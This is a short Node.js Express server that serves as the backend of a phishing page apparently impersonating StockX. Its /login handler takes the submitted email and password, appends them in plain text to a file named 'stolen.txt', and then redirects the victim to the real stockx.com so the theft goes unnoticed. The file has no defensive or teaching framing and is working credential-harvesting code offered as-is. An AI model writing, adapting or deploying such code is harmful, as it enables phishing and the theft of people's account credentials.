const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000; // Standard unprivileged port

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname))); // Serves index.html

// Handle form submission
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync('stolen.txt', entry); // Save to file
  res.redirect('https://stockx.com'); // Redirect to real site
});

// Start HTTP server
app.listen(PORT, () => {
  console.log(`🚀 HTTP server running at http://localhost:${PORT}`);
});
